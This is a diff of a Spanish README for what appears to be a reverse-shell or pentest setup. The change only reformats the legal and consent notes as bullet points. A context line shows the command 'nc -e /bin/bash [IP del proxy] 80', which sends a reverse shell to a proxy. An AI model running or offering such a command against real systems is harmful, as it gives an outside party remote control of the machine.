@@ -26,6 +26,6 @@ Ejecutar el siguiente comando para enviar una shell inversa al proxy en el puert
 nc -e /bin/bash [IP del proxy] 80
 
 # Consideraciones Importantes
-Asegúrate de tener los permisos adecuados y el consentimiento del propietario del sistema antes de realizar estas acciones.
-Las direcciones IP y los puertos mencionados en este README son ejemplos y deben reemplazarse por las direcciones IP y puertos reales de tu configuración.
-Es fundamental respetar las leyes y regulaciones locales relacionadas con la seguridad informática y la privacidad.
+- Asegúrate de tener los permisos adecuados y el consentimiento del propietario del sistema antes de realizar estas acciones.
+- Las direcciones IP y los puertos mencionados en este README son ejemplos y deben reemplazarse por las direcciones IP y puertos reales de tu configuración.
+- Es fundamental respetar las leyes y regulaciones locales relacionadas con la seguridad informática y la privacidad.
